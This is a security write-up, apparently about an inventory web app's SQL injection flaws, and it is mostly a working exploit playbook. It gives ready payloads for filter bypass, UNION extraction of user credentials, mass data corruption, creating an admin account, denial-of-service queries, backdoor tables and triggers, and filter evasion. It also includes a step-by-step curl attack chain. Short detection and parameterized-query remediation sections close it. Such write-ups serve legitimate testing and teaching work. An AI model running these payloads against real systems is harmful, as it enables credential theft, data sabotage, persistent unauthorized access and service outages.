# SQL Injection Attack Demonstrations
## Detailed Exploitation Guide with Malicious Payloads

**WARNING: For Educational and Security Testing Purposes Only**  
**Date:** February 5, 2026  
**System:** Legacy Inventory Management System

---

## Table of Contents

1. [Understanding the Vulnerabilities](#understanding-the-vulnerabilities)
2. [Attack Scenario 1: Authentication Bypass](#attack-scenario-1-authentication-bypass)
3. [Attack Scenario 2: Data Exfiltration](#attack-scenario-2-data-exfiltration)
4. [Attack Scenario 3: Data Manipulation](#attack-scenario-3-data-manipulation)
5. [Attack Scenario 4: Database Schema Discovery](#attack-scenario-4-database-schema-discovery)
6. [Attack Scenario 5: Privilege Escalation](#attack-scenario-5-privilege-escalation)
7. [Attack Scenario 6: Denial of Service](#attack-scenario-6-denial-of-service)
8. [Attack Scenario 7: Persistent Backdoor](#attack-scenario-7-persistent-backdoor)

---

## Understanding the Vulnerabilities

### Vulnerable Code Pattern

All endpoints in `app.py` use f-strings to construct SQL queries:

```python
# VULNERABLE CODE - DO NOT USE
cursor.execute(f"SELECT * FROM inventory WHERE warehouse_id = {warehouse_id}")
```

This allows attackers to inject arbitrary SQL code through user input.

### Why This Is Dangerous

When user input is directly concatenated into SQL queries:
1. **No Sanitization:** Special characters are not escaped
2. **No Validation:** Input is not checked for malicious content
3. **Direct Execution:** Injected SQL runs with full database privileges
4. **No Boundaries:** Attacker can break out of intended query structure

---

## Attack Scenario 1: Authentication Bypass

### Target Endpoint
```
GET /inventory/list?warehouse_id={value}
```

### Vulnerable Code
```python
warehouse_id = request.args.get('warehouse_id')
cursor.execute(f"SELECT * FROM inventory WHERE warehouse_id = {warehouse_id}")
```

### Attack Payloads

#### Payload 1: Basic Boolean Bypass
```
GET /inventory/list?warehouse_id=1 OR 1=1
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 OR 1=1
```

**Explanation:**
- `1 OR 1=1` creates a condition that's always TRUE
- Query returns ALL inventory items from ALL warehouses
- Bypasses intended warehouse filtering

**Expected Result:**
```json
[
  {"id": 1, "item_name": "Widget A", "quantity": 100, "warehouse_id": 1},
  {"id": 2, "item_name": "Widget B", "quantity": 200, "warehouse_id": 2},
  {"id": 3, "item_name": "Secret Item", "quantity": 50, "warehouse_id": 3},
  {"id": 4, "item_name": "Confidential", "quantity": 75, "warehouse_id": 4}
]
```

#### Payload 2: Comment-Based Bypass
```
GET /inventory/list?warehouse_id=1 OR 1=1--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 OR 1=1--
```

**Explanation:**
- `--` is SQL comment syntax
- Everything after `--` is ignored
- Useful for bypassing additional WHERE conditions

#### Payload 3: Always-True Condition
```
GET /inventory/list?warehouse_id=1 OR 'a'='a'
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 OR 'a'='a'
```

**Explanation:**
- String comparison `'a'='a'` is always TRUE
- Alternative to numeric comparison
- Works even with string-based filters

---

## Attack Scenario 2: Data Exfiltration

### Target Endpoint
```
GET /inventory/list?warehouse_id={value}
```

### Attack Payloads

#### Payload 1: UNION-Based Data Extraction
```
GET /inventory/list?warehouse_id=1 UNION SELECT name, type, sql, 1 FROM sqlite_master WHERE type='table'--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 
UNION 
SELECT name, type, sql, 1 FROM sqlite_master WHERE type='table'--
```

**Explanation:**
- `UNION` combines results from two queries
- `sqlite_master` is SQLite's system table containing schema information
- Returns table names and their CREATE statements
- `--` comments out rest of query

**Expected Result:**
```json
[
  {
    "id": "inventory",
    "item_name": "table",
    "quantity": "CREATE TABLE inventory (id INTEGER PRIMARY KEY, item_name TEXT, quantity INTEGER, warehouse_id INTEGER)",
    "warehouse_id": 1
  },
  {
    "id": "users",
    "item_name": "table",
    "quantity": "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, email TEXT)",
    "warehouse_id": 1
  }
]
```

#### Payload 2: Extract All Column Names
```
GET /inventory/list?warehouse_id=1 UNION SELECT name, '', '', 1 FROM pragma_table_info('inventory')--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 
UNION 
SELECT name, '', '', 1 FROM pragma_table_info('inventory')--
```

**Expected Result:**
```json
[
  {"id": "id", "item_name": "", "quantity": "", "warehouse_id": 1},
  {"id": "item_name", "item_name": "", "quantity": "", "warehouse_id": 1},
  {"id": "quantity", "item_name": "", "quantity": "", "warehouse_id": 1},
  {"id": "warehouse_id", "item_name": "", "quantity": "", "warehouse_id": 1}
]
```

#### Payload 3: Extract Data from Other Tables
```
GET /inventory/list?warehouse_id=1 UNION SELECT username, password, email, 1 FROM users--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 
UNION 
SELECT username, password, email, 1 FROM users--
```

**Expected Result:**
```json
[
  {"id": "admin", "item_name": "hashed_password_123", "quantity": "admin@company.com", "warehouse_id": 1},
  {"id": "john_doe", "item_name": "hashed_password_456", "quantity": "john@company.com", "warehouse_id": 1}
]
```

**Impact:** Complete database compromise - all tables accessible

---

## Attack Scenario 3: Data Manipulation

### Target Endpoint
```
PUT /inventory/update/{item_id}
Body: {"quantity": value}
```

### Vulnerable Code
```python
quantity = data.get('quantity')
cursor.execute(f"UPDATE inventory SET quantity = {quantity} WHERE id = {item_id}")
```

### Attack Payloads

#### Payload 1: Update All Records
```json
PUT /inventory/update/1
{
  "quantity": "999999 WHERE id > 0; --"
}
```

**Resulting SQL:**
```sql
UPDATE inventory SET quantity = 999999 WHERE id > 0; -- WHERE id = 1
```

**Explanation:**
- Injected `WHERE id > 0` affects ALL records
- `;` terminates the statement
- `--` comments out original WHERE clause
- All inventory quantities set to 999999

**Impact:** Complete inventory data corruption

#### Payload 2: Conditional Update
```json
PUT /inventory/update/1
{
  "quantity": "0 WHERE warehouse_id = 2; --"
}
```

**Resulting SQL:**
```sql
UPDATE inventory SET quantity = 0 WHERE warehouse_id = 2; -- WHERE id = 1
```

**Explanation:**
- Sets all items in warehouse 2 to zero quantity
- Targeted sabotage of specific warehouse
- Could cause operational disruption

#### Payload 3: Multi-Column Update
```json
PUT /inventory/update/1
{
  "quantity": "0, item_name = 'HACKED' WHERE id > 0; --"
}
```

**Resulting SQL:**
```sql
UPDATE inventory SET quantity = 0, item_name = 'HACKED' WHERE id > 0; -- WHERE id = 1
```

**Explanation:**
- Updates multiple columns simultaneously
- Changes both quantity and item_name
- Visible evidence of compromise

---

## Attack Scenario 4: Database Schema Discovery

### Target Endpoint
```
GET /inventory/list?warehouse_id={value}
```

### Attack Payloads

#### Payload 1: List All Tables
```
GET /inventory/list?warehouse_id=1 UNION SELECT name, type, '', 1 FROM sqlite_master--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 
UNION 
SELECT name, type, '', 1 FROM sqlite_master--
```

**Expected Result:**
```json
[
  {"id": "inventory", "item_name": "table", "quantity": "", "warehouse_id": 1},
  {"id": "users", "item_name": "table", "quantity": "", "warehouse_id": 1},
  {"id": "orders", "item_name": "table", "quantity": "", "warehouse_id": 1},
  {"id": "customers", "item_name": "table", "quantity": "", "warehouse_id": 1}
]
```

#### Payload 2: Get Table Row Counts
```
GET /inventory/list?warehouse_id=1 UNION SELECT 'inventory', COUNT(*), '', 1 FROM inventory UNION SELECT 'users', COUNT(*), '', 1 FROM users--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 
UNION 
SELECT 'inventory', COUNT(*), '', 1 FROM inventory 
UNION 
SELECT 'users', COUNT(*), '', 1 FROM users--
```

**Expected Result:**
```json
[
  {"id": "inventory", "item_name": "150", "quantity": "", "warehouse_id": 1},
  {"id": "users", "item_name": "25", "quantity": "", "warehouse_id": 1}
]
```

#### Payload 3: Extract Database Version
```
GET /inventory/list?warehouse_id=1 UNION SELECT sqlite_version(), '', '', 1--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 
UNION 
SELECT sqlite_version(), '', '', 1--
```

**Expected Result:**
```json
[
  {"id": "3.39.4", "item_name": "", "quantity": "", "warehouse_id": 1}
]
```

---

## Attack Scenario 5: Privilege Escalation

### Target Endpoint
```
POST /inventory/add
Body: {"item_name": value, "quantity": value, "warehouse_id": value}
```

### Vulnerable Code
```python
cursor.execute(f"INSERT INTO inventory (item_name, quantity, warehouse_id) VALUES ('{item_name}', {quantity}, {warehouse_id})")
```

### Attack Payloads

#### Payload 1: Create Admin User (if users table exists)
```json
POST /inventory/add
{
  "item_name": "test'); INSERT INTO users (username, password, role) VALUES ('attacker', 'hacked123', 'admin'); --",
  "quantity": 1,
  "warehouse_id": 1
}
```

**Resulting SQL:**
```sql
INSERT INTO inventory (item_name, quantity, warehouse_id) 
VALUES ('test'); 
INSERT INTO users (username, password, role) 
VALUES ('attacker', 'hacked123', 'admin'); 
--', 1, 1)
```

**Explanation:**
- First statement inserts benign inventory item
- Second statement creates admin user account
- Attacker now has administrative access
- Persistent backdoor established

#### Payload 2: Grant Database Permissions
```json
POST /inventory/add
{
  "item_name": "test'); GRANT ALL PRIVILEGES ON DATABASE inventory_db TO attacker; --",
  "quantity": 1,
  "warehouse_id": 1
}
```

**Note:** This works on PostgreSQL/MySQL but not SQLite

---

## Attack Scenario 6: Denial of Service

### Target Endpoint
```
GET /inventory/list?warehouse_id={value}
```

### Attack Payloads

#### Payload 1: Resource Exhaustion
```
GET /inventory/list?warehouse_id=1 UNION SELECT * FROM inventory a, inventory b, inventory c, inventory d--
```

**Resulting SQL:**
```sql
SELECT * FROM inventory WHERE warehouse_id = 1 
UNION 
SELECT * FROM inventory a, inventory b, inventory c, inventory d--
```

**Explanation:**
- Cartesian product of inventory table with itself 4 times
- If table has 100 rows: 100^4 = 100,000,000 rows returned
- Exhausts server memory and CPU
- Application becomes unresponsive

#### Payload 2: Infinite Loop (SQLite specific)
```
GET /inventory/list?warehouse_id=1; WITH RECURSIVE r(i) AS (SELECT 1 UNION ALL SELECT i+1 FROM r) SELECT * FROM r--
```

**Explanation:**
- Creates recursive query that never terminates
- Consumes all available resources
- Requires database restart

#### Payload 3: Sleep Attack (time-based)
```
GET /inventory/list?warehouse_id=1 AND (SELECT COUNT(*) FROM inventory WHERE RANDOM() > 0.5)--
```

**Explanation:**
- Forces database to perform expensive operations
- Slows down response time significantly
- Repeated requests cause DoS

---

## Attack Scenario 7: Persistent Backdoor

### Target Endpoint
```
POST /inventory/add
```

### Attack Payloads

#### Payload 1: Create Backdoor Table
```json
POST /inventory/add
{
  "item_name": "test'); CREATE TABLE IF NOT EXISTS backdoor (id INTEGER PRIMARY KEY, cmd TEXT, output TEXT, timestamp DATETIME DEFAULT CURRENT_TIMESTAMP); INSERT INTO backdoor (cmd) VALUES ('backdoor_installed'); --",
  "quantity": 1,
  "warehouse_id": 1
}
```

**Resulting SQL:**
```sql
INSERT INTO inventory (item_name, quantity, warehouse_id) 
VALUES ('test'); 
CREATE TABLE IF NOT EXISTS backdoor (
    id INTEGER PRIMARY KEY, 
    cmd TEXT, 
    output TEXT, 
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
); 
INSERT INTO backdoor (cmd) VALUES ('backdoor_installed'); 
--', 1, 1)
```

**Explanation:**
- Creates hidden table for command execution
- Persists even after credentials are rotated
- Can be used for ongoing data exfiltration

#### Payload 2: Create Trigger-Based Backdoor
```json
POST /inventory/add
{
  "item_name": "test'); CREATE TRIGGER backdoor_trigger AFTER INSERT ON inventory BEGIN INSERT INTO backdoor (cmd, output) VALUES ('new_item', NEW.item_name); END; --",
  "quantity": 1,
  "warehouse_id": 1
}
```

**Resulting SQL:**
```sql
INSERT INTO inventory (item_name, quantity, warehouse_id) 
VALUES ('test'); 
CREATE TRIGGER backdoor_trigger 
AFTER INSERT ON inventory 
BEGIN 
    INSERT INTO backdoor (cmd, output) 
    VALUES ('new_item', NEW.item_name); 
END; 
--', 1, 1)
```

**Explanation:**
- Creates database trigger that fires on every INSERT
- Automatically logs all new inventory items to backdoor table
- Difficult to detect without thorough database audit

---

## Complete Attack Chain Example

### Step-by-Step Full Compromise

#### Step 1: Reconnaissance
```bash
# Discover database structure
curl "http://localhost:5000/inventory/list?warehouse_id=1%20UNION%20SELECT%20name,%20type,%20sql,%201%20FROM%20sqlite_master--"
```

**Result:** List of all tables and their schemas

#### Step 2: Data Exfiltration
```bash
# Extract all inventory data
curl "http://localhost:5000/inventory/list?warehouse_id=1%20OR%201=1--"

# Extract user credentials (if users table exists)
curl "http://localhost:5000/inventory/list?warehouse_id=1%20UNION%20SELECT%20username,%20password,%20email,%201%20FROM%20users--"
```

**Result:** Complete database dump

#### Step 3: Create Backdoor
```bash
# Create persistent backdoor table
curl -X POST http://localhost:5000/inventory/add \
  -H "Content-Type: application/json" \
  -d '{
    "item_name": "test'\'''); CREATE TABLE backdoor (id INTEGER PRIMARY KEY, data TEXT); INSERT INTO backdoor (data) VALUES ('\''compromised'\''); --",
    "quantity": 1,
    "warehouse_id": 1
  }'
```

**Result:** Backdoor table created

#### Step 4: Data Manipulation
```bash
# Corrupt all inventory data
curl -X PUT http://localhost:5000/inventory/update/1 \
  -H "Content-Type: application/json" \
  -d '{"quantity": "0 WHERE id > 0; --"}'
```

**Result:** All inventory quantities set to zero

#### Step 5: Verify Backdoor
```bash
# Check if backdoor persists
curl "http://localhost:5000/inventory/list?warehouse_id=1%20UNION%20SELECT%20*,%20'',%20'',%201%20FROM%20backdoor--"
```

**Result:** Backdoor confirmed, persistent access established

---

## Defense Evasion Techniques

### Technique 1: URL Encoding
```
# Original payload
warehouse_id=1 OR 1=1

# URL encoded
warehouse_id=1%20OR%201%3D1
```

### Technique 2: Case Variation
```
warehouse_id=1 oR 1=1
warehouse_id=1 Or 1=1
warehouse_id=1 OR 1=1
```

### Technique 3: Comment Obfuscation
```
warehouse_id=1/*comment*/OR/*comment*/1=1
```

### Technique 4: Whitespace Manipulation
```
warehouse_id=1    OR    1=1
warehouse_id=1	OR	1=1  (using tabs)
```

---

## Impact Summary

### Successful Exploitation Enables:

1. **Complete Data Breach**
   - Access to all inventory records
   - Access to user credentials
   - Access to customer data
   - Access to business intelligence

2. **Data Manipulation**
   - Modify inventory quantities
   - Change product names
   - Corrupt financial records
   - Sabotage operations

3. **Persistent Access**
   - Create backdoor tables
   - Install database triggers
   - Establish command & control
   - Maintain access after credential rotation

4. **Denial of Service**
   - Resource exhaustion attacks
   - Database crashes
   - Application unavailability
   - Business disruption

5. **Privilege Escalation**
   - Create admin accounts
   - Grant database permissions
   - Bypass access controls
   - Full system compromise

---

## Detection Indicators

### Signs of SQL Injection Attack:

1. **Log Patterns:**
   - Unusual SQL keywords in request parameters (UNION, SELECT, DROP)
   - Multiple SQL statements in single request
   - SQL comments (-- or /* */) in parameters
   - Excessive query execution time

2. **Database Behavior:**
   - Unexpected table creation
   - Unusual query patterns
   - High CPU/memory usage
   - Slow query performance

3. **Application Behavior:**
   - Unexpected data in responses
   - Error messages revealing database structure
   - Timeouts or crashes
   - Unusual data modifications

---

## Remediation (How to Fix)

### Immediate Fix: Parameterized Queries

**BEFORE (Vulnerable):**
```python
cursor.execute(f"SELECT * FROM inventory WHERE warehouse_id = {warehouse_id}")
```

**AFTER (Secure):**
```python
cursor.execute("SELECT * FROM inventory WHERE warehouse_id = ?", (warehouse_id,))
```

### Complete Secure Implementation:

```python
@app.route('/inventory/list', methods=['GET'])
def list_inventory():
    warehouse_id = request.args.get('warehouse_id')
    
    # Input validation
    if warehouse_id:
        try:
            warehouse_id = int(warehouse_id)
            if warehouse_id < 1:
                return jsonify({'error': 'Invalid warehouse_id'}), 400
        except ValueError:
            return jsonify({'error': 'warehouse_id must be an integer'}), 400
    
    conn = get_db_connection()
    cursor = conn.cursor()
    
    try:
        if warehouse_id:
            # Parameterized query - SECURE
            cursor.execute(
                "SELECT * FROM inventory WHERE warehouse_id = ?", 
                (warehouse_id,)
            )
        else:
            cursor.execute("SELECT * FROM inventory")
        
        items = cursor.fetchall()
        
        inventory_list = []
        for item in items:
            inventory_list.append({
                'id': item[0],
                'item_name': item[1],
                'quantity': item[2],
                'warehouse_id': item[3]
            })
        
        return jsonify(inventory_list)
        
    except Exception as e:
        app.logger.error(f"Database error: {str(e)}")
        return jsonify({'error': 'Internal server error'}), 500
        
    finally:
        conn.close()
```

---

## Conclusion

The SQL injection vulnerabilities in this application are **CRITICAL** and allow:
- Complete database compromise
- Data theft and manipulation
- Persistent backdoor installation
- Denial of service attacks
- Privilege escalation

**All endpoints must be immediately patched** using parameterized queries and input validation before any production deployment.

---

**Document Version:** 1.0  
**Last Updated:** February 5, 2026  
**Classification:** CONFIDENTIAL - Security Research